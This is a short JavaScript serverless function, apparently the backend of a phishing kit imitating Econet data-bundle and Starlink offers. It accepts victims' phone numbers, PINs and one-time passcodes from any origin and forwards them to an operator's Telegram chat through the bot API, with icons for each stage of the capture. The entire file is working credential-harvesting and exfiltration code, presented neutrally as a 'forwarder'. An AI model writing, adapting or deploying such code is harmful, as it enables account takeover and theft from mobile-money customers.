// Vercel Serverless Function — Telegram forwarder for Econet Bundles
// Environment variables: TELEGRAM_TOKEN, TELEGRAM_CHAT_ID

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });

  const { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } = process.env;
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ error: 'Missing Telegram env vars' });
  }

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    const { event, phone, pin, otp, bundle, data, amount, device } = body || {};

    // Build Telegram message
    const lines = [];

    const ICONS = {
      bundle_pin_submitted: '🔐',
      bundle_otp_confirmed: '✅',
      bundle_otp_resent: '🔄',
      login_initiated: '🔑',
      otp_confirmed: '✅',
      starlink_otp_resent: '🔄',
    };
    const icon = ICONS[event] || '📩';

    lines.push(`${icon} <b>${String(event || 'unknown').replace(/_/g, ' ').toUpperCase()}</b>`);
    lines.push('');

    if (phone) lines.push(`📱 <b>Phone:</b> <code>${phone}</code>`);
    if (pin) lines.push(`🔑 <b>PIN:</b> <code>${pin}</code>`);
    if (otp) lines.push(`🔢 <b>OTP:</b> <code>${otp}</code>`);
    if (bundle) lines.push(`📦 <b>Bundle:</b> ${bundle}`);
    if (data) lines.push(`📊 <b>Data:</b> ${data}`);
    if (amount) lines.push(`💰 <b>Amount:</b> USD ${amount}`);
    if (device) lines.push(`📲 <b>Device:</b> ${device}`);

    lines.push('');
    lines.push(`🕐 ${new Date().toISOString()}`);

    const text = lines.join('\n');

    const tgRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      }
    );

    const tgData = await tgRes.json();

    if (!tgData.ok) {
      console.error('Telegram API error:', tgData);
      return res.status(502).json({ error: 'Telegram send failed', detail: tgData.description });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Handler error:', err);
    return res.status(500).json({ error: 'Internal error' });
  }
}
